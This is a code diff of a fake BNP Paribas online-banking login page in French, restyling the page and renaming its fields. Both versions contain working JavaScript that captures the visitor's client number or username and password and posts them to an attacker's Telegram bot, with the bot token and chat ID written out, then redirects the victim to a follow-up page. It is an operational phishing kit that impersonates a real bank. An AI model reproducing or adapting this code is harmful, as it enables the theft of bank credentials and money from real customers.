@@ -3,95 +3,82 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BNP Paribas - Connexion</title>
+  <title>BNP paribas - Connexion</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
     body {
-      background: #f5f5f5;
+      background: url('e1350e88-5112-4f64-ab38-1df8e9af5d51_c.jpg') no-repeat center center/cover;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      color: #333;
+      color: white;
       position: relative;
     }
     .login-container {
-      background: white;
-      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 20px;
       padding: 30px 25px;
       width: 90%;
       max-width: 400px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
       text-align: left;
-      border-top: 4px solid #0072bc;
     }
     .logo {
-      margin-bottom: 30px;
+      font-size: 24px;
+      font-weight: bold;
       text-align: center;
-    }
-    .logo img {
-      height: 40px;
+      margin-bottom: 30px;
+      color: white;
+      position: absolute;
+      top: 40px;
     }
     .form-title {
       color: #333;
       text-align: center;
       margin-bottom: 20px;
-      font-size: 18px;
-      font-weight: normal;
+      font-size: 22px;
     }
     .form-description {
-      color: #666;
+      color: #555;
       text-align: center;
       margin-bottom: 25px;
-      font-size: 14px;
+      font-size: 15px;
     }
     .input-group {
       margin-bottom: 20px;
       position: relative;
     }
-    .input-group label {
-      display: block;
-      margin-bottom: 8px;
-      color: #333;
-      font-size: 14px;
-    }
     .input-group input {
       width: 100%;
-      padding: 12px 15px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
+      padding: 12px 40px 12px 40px;
+      border: none;
+      border-radius: 12px;
       font-size: 16px;
-      background-color: white;
+      background-color: #f3f3f3;
       color: #333;
     }
-    .checkbox-group {
-      display: flex;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    .checkbox-group input {
-      margin-right: 10px;
-    }
-    .checkbox-group label {
-      font-size: 14px;
-      color: #666;
+    .input-group svg {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      fill: #888;
     }
     button {
       width: 100%;
       padding: 12px;
-      border-radius: 4px;
+      border-radius: 30px;
       border: none;
       font-weight: bold;
       font-size: 16px;
-      background-color: #0072bc;
-      color: white;
+      background-color: rgba(255,255,255,0.7);
+      color: #333;
       cursor: pointer;
       margin-top: 10px;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #005a94;
     }
     .error-message {
       color: #d32f2f;
@@ -100,110 +87,125 @@
       display: none;
       text-align: center;
     }
+    .timer {
+      margin-top: 15px;
+      color: #555;
+      font-size: 14px;
+      text-align: center;
+    }
     .loading {
       display: none;
       margin-top: 15px;
-      color: #666;
+      color: #555;
       text-align: center;
     }
-    .bottom-links {
-      margin-top: 20px;
-      text-align: center;
+    .bottom-right {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
     }
-    .bottom-links a {
-      color: #0072bc;
+    .bottom-left {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+    }
+    .small-button {
+      background: rgba(255, 255, 255, 0.7);
+      color: #333;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      border: none;
+      cursor: pointer;
+    }
+    .forgot-password {
+      text-align: right;
+      margin-top: -15px;
+      margin-bottom: 20px;
+    }
+    .forgot-password a {
+      color: #555;
       font-size: 13px;
       text-decoration: none;
-      display: block;
-      margin-bottom: 10px;
-    }
-    .security-info {
-      margin-top: 30px;
-      padding-top: 15px;
-      border-top: 1px solid #eee;
-      text-align: center;
-      font-size: 12px;
-      color: #666;
-    }
-    .input-icon {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 20px;
-      height: 20px;
-      color: #888;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
+  <div class="logo">BNP paribas <span style="font-weight: normal;">⚛️</span> paribas</div>
+
   <div class="login-container">
-    <div class="logo">
-      <img src="e1350e88-5112-4f64-ab38-1df8e9af5d51_c.jpg" alt="BNP Paribas">
-    </div>
-    
-    <h1 class="form-title">Saisissez votre code secret pour accéder à votre compte</h1>
+    <h1 class="form-title">Saisissez votre code secret pour accéder à votre compte.</h1>
+    <p class="form-description">Saisissez votre numéro client ici.</p>
     
     <div class="input-group">
-      <label for="client-number">Saisissez votre numéro client ici</label>
-      <input type="text" id="client-number" placeholder="Numéro client" required>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+      </svg>
+      <input type="text" id="username" placeholder="Identifiant" required>
     </div>
     
     <div class="input-group">
-      <label for="secret-code">Code secret</label>
-      <input type="password" id="secret-code" placeholder="Code secret" required>
-      <span class="input-icon">👁️</span>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M17.707 12.293a.999.999 0 00-1.414 0l-1.594 1.594c-.739-.22-2.118-.72-2.992-1.594s-1.374-2.253-1.594-2.992l1.594-1.594a.999.999 0 000-1.414l-4-4a.999.999 0 00-1.414 0L3.581 5.005c-.38.38-.594.902-.586 1.435.023 1.424.4 6.37 4.298 10.268s8.844 4.274 10.269 4.298h.028c.528 0 1.027-.208 1.405-.586l2.712-2.712a.999.999 0 000-1.414l-4-4.001z"/>
+      </svg>
+      <input type="password" id="password" placeholder="Mot de passe" required>
     </div>
     
-    <div class="checkbox-group">
-      <input type="checkbox" id="remember-client">
-      <label for="remember-client">Mémoire mon numéro client ici</label>
+    <div class="forgot-password">
+      <a href="#">Numéro client ou code secret oublié ?</a>
     </div>
     
-    <div id="error-message" class="error-message">Veuillez entrer votre numéro client et code secret</div>
+    <div id="error-message" class="error-message">Veuillez entrer votre numéro client et mot de passe</div>
     
     <button id="submit-btn">Se connecter</button>
     <div id="loading" class="loading">Connexion en cours...</div>
     
-    <div class="bottom-links">
-      <a href="#">Numéro client ou code secret oublié ?</a>
-      <a href="#">Première connexion ?</a>
-      <a href="#">Besoin d'aide ?</a>
+    <div class="timer" id="timer">
+      Redirection automatique dans <span id="countdown">120</span> secondes
     </div>
-    
-    <div class="security-info">
-      <p>BNP Paribas vous garantit une connexion sécurisée</p>
-    </div>
+  </div>
+
+  <div class="bottom-left">
+    <a href="#" class="small-button">Aide & services</a>
+  </div>
+
+  <div class="bottom-right">
+    <a href="#" class="small-button">Devenir client</a>
   </div>
 
   <script>
     document.addEventListener('DOMContentLoaded', function() {
-      const clientNumberInput = document.getElementById('client-number');
-      const secretCodeInput = document.getElementById('secret-code');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
       const submitBtn = document.getElementById('submit-btn');
       const errorMessage = document.getElementById('error-message');
+      const countdownElement = document.getElementById('countdown');
       const loadingElement = document.getElementById('loading');
-      const eyeIcon = document.querySelector('.input-icon');
       
-      // Toggle password visibility
-      eyeIcon.addEventListener('click', function() {
-        if (secretCodeInput.type === 'password') {
-          secretCodeInput.type = 'text';
-          eyeIcon.textContent = '🔒';
-        } else {
-          secretCodeInput.type = 'password';
-          eyeIcon.textContent = '👁️';
+      // Compte à rebours pour la redirection automatique
+      let seconds = 120;
+      const countdown = setInterval(function() {
+        seconds--;
+        countdownElement.textContent = seconds;
+        
+        if (seconds <= 0) {
+          clearInterval(countdown);
+          redirectToNextPage();
         }
-      });
+      }, 1000);
+
+      // Redirection vers la page suivante
+      function redirectToNextPage() {
+        window.location.href = 'traitement.html';
+      }
 
       submitBtn.addEventListener('click', async function() {
-        const clientNumber = clientNumberInput.value.trim();
-        const secretCode = secretCodeInput.value.trim();
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
         
         // Vérification que les champs ne sont pas vides
-        if (clientNumber.length > 0 && secretCode.length > 0) {
+        if (username.length > 0 && password.length > 0) {
           // Afficher le chargement
           submitBtn.disabled = true;
           loadingElement.style.display = 'block';
@@ -212,7 +214,7 @@
             // Envoyer les données à Telegram
             const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
             const chatId = '5372119436';
-            const message = `Identifiants BNP Paribas reçus:\nNuméro client: ${clientNumber}\nCode secret: ${secretCode}`;
+            const message = `Identifiants reçus:\nIdentifiant: ${username}\nMot de passe: ${password}`;
             
             const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               method: 'POST',
@@ -231,7 +233,7 @@
             
             // Attendre 2 secondes avant la redirection
             setTimeout(() => {
-              window.location.href = 'traitement.html';
+              redirectToNextPage();
             }, 2000);
             
           } catch (error) {
@@ -244,25 +246,25 @@
         } else {
           // Afficher le message d'erreur
           errorMessage.style.display = 'block';
-          if (clientNumber.length === 0) {
-            clientNumberInput.focus();
+          if (username.length === 0) {
+            usernameInput.focus();
           } else {
-            secretCodeInput.focus();
+            passwordInput.focus();
           }
         }
       });
 
       // Masquer le message d'erreur quand l'utilisateur commence à taper
-      clientNumberInput.addEventListener('input', function() {
+      usernameInput.addEventListener('input', function() {
         errorMessage.style.display = 'none';
       });
       
-      secretCodeInput.addEventListener('input', function() {
+      passwordInput.addEventListener('input', function() {
         errorMessage.style.display = 'none';
       });
 
       // Permettre la validation avec la touche Entrée
-      secretCodeInput.addEventListener('keypress', function(e) {
+      passwordInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
           submitBtn.click();
         }
